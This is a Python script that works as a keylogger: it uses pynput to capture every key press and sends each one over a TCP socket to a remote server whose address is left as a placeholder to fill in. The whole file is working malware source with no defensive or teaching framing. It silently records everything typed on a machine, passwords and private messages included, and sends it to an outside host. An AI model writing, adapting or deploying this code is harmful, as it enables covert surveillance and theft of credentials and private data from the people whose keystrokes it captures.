import socket
from pynput import keyboard

SERVER_IP = '<SERVER_IP>'  # Change it to server IP
SERVER_PORT = <PORT>       # Change it to server port

def on_press(key):
    try:
        key_data = '\nAlphanumeric key pressed: {0} '.format(key.char)
    except AttributeError:
        key_data = '\nSpecial key pressed: {0} '.format(key)

    send_data(key_data)

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

def send_data(data):
    try:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((SERVER_IP, SERVER_PORT))
        client_socket.sendall(data.encode('utf-8'))
        client_socket.close()
    except Exception as e:
        print(f"Error sending data: {e}")

if __name__ == "__main__":
    with keyboard.Listener(
            on_press=on_press,
            on_release=on_release) as listener:
        listener.join()
